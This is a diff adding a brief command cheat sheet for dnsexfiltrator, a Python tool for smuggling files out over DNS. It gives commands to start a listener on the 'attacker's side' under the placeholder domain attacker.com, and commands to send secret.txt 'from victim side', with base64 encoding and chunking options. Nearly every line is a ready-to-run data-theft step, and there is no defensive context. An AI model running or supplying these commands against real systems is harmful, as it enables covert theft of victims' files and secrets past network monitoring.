@@ -1,0 +1,18 @@
+# ==========================
+# dnsexfiltrator (Python tool for DNS exfiltration)
+# ==========================
+
+# Start DNS listener (on attacker's side)
+python3 dnsexfiltrator.py --listener --host 0.0.0.0 --port 53 --domain attacker.com
+
+# Send file from victim side
+python3 dnsexfiltrator.py --exfil --file secret.txt --domain attacker.com --dns <dns_server_ip>
+
+# Use base64 encoding
+python3 dnsexfiltrator.py --exfil --file secret.txt --domain attacker.com --dns <dns_server_ip> --base64
+
+# Optional: Specify chunk size
+python3 dnsexfiltrator.py --exfil --file secret.txt --domain attacker.com --dns <dns_server_ip> --chunk 60
+
+# View help
+python3 dnsexfiltrator.py -h
